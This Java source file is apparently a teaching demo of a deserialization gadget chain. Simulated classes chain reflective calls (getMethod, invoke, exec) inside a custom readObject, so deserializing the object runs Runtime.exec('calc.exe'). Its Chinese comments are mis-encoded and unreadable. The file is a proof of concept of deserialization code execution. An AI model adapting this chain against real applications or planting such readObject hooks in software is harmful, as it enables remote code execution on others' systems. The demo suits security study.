package fanxulie;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;

public class ReflectionPlay implements Serializable{

	  public static void main(String[] args) throws Exception {
	      new ReflectionPlay().run();
	  }

	  public void run() throws Exception {
	      byte[] ObjectBytes=serialize(getObject());
	      deserialize(ObjectBytes);
	  }

	  //�ڴ˷����з��ض������
	  public Object getObject() {
	      String command = "calc.exe";
	      Object firstObject = Runtime.class;
	      ReflectionObject[] reflectionChains = {
	              //���� Runtime.class ��getMethod����,Ѱ�� getRuntime�������õ�һ��Method����(getRuntime����)
	              //��ͬ�� Runtime.class.getMethod("getRuntime",new Class[]{String.class,Class[].class})
	              new ReflectionObject("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
	              //���� Method �� invoker �������Եõ�һ��Runtime����
	              // ��ͬ�� method.invoke(null),��̬�������ô������
	              new ReflectionObject("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
	              //����RunTime�����exec����,���� command��Ϊ����ִ������
	              new ReflectionObject("exec", new Class[]{String.class}, new Object[]{command})
	      };

	      return new ReadObject(new ReflectionChains(firstObject, reflectionChains));
	  }

	  /*
	   * ���л�����byte����
	   * */
	  public byte[] serialize(final Object obj) throws IOException {
	      ByteArrayOutputStream out = new ByteArrayOutputStream();
	      ObjectOutputStream objOut = new ObjectOutputStream(out);
	      objOut.writeObject(obj);
	      return out.toByteArray();
	  }

	  /*
	   * ��byte�����з����л�����
	   * */
	  public Object deserialize(final byte[] serialized) throws IOException, ClassNotFoundException {
	      ByteArrayInputStream in = new ByteArrayInputStream(serialized);
	      ObjectInputStream objIn = new ObjectInputStream(in);
	      return objIn.readObject();
	  }

	  /*
	  * һ��ģ��ӵ��©�����࣬��Ҫ�ṩ�Ĺ����Ǹ����Լ��������е�ֵ�����з������
	  * */
	  class ReflectionObject implements Serializable{
	      private String methodName;
	      private Class[] paramTypes;
	      private Object[] args;

	      public ReflectionObject(String methodName, Class[] paramTypes, Object[] args) {
	          this.methodName = methodName;
	          this.paramTypes = paramTypes;
	          this.args = args;
	      }

	      //����  methodName, paramTypes ��Ѱ�Ҷ���ķ��������� args��Ϊ�������е���
	      public Object transform(Object input) throws Exception {
	          Class inputClass = input.getClass();
	          return inputClass.getMethod(methodName, paramTypes).invoke(input, args);
	      }
	  }

	  /*
	  * һ������ģ���ṩ����������,
	  * ��Ҫ�Ĺ����ǽ� ReflectionObject���д�������,��ReflectionObjectһ�𹹳�©�������һ����
	  * */
	  class ReflectionChains implements Serializable{

	      private Object firstObject;
	      private ReflectionObject[] reflectionObjects;

	      public ReflectionChains(Object firstObject, ReflectionObject[] reflectionObjects) {
	          this.firstObject = firstObject;
	          this.reflectionObjects = reflectionObjects;
	      }

	      public Object execute() throws Exception {
	          Object concurrentObject = firstObject;
	          for (ReflectionObject reflectionObject : reflectionObjects) {
	              concurrentObject = reflectionObject.transform(concurrentObject);
	          }
	          return concurrentObject;
	      }
	  }

	  /**
	   * һ���ȴ����л�����,ӵ��һ�����Ժ�һ����д�˵�readObject����
	   * ������readObject������ִ���˸����Ե�һ������
	   * */
	  class ReadObject implements Serializable {

	      private ReflectionChains reflectionChains;

	      public ReadObject(ReflectionChains reflectionChains) {
	          this.reflectionChains = reflectionChains;
	      }
	      //�������л���ʱ���������ᱻ����
	      //�÷��������õ�ʱ�������Զ��ǿ�
	      private void readObject(java.io.ObjectInputStream stream)
	              throws IOException, ClassNotFoundException {
	          try {
	              //����ģ�⵱readObject��ʱ�򣬶���������Խ�����һЩ����Ĳ���
	              reflectionChains= (ReflectionChains) stream.readFields().get("reflectionChains",null);
	              reflectionChains.execute();
	          } catch (Exception e) {
	              e.printStackTrace();
	          }
	      }
	  }
	}
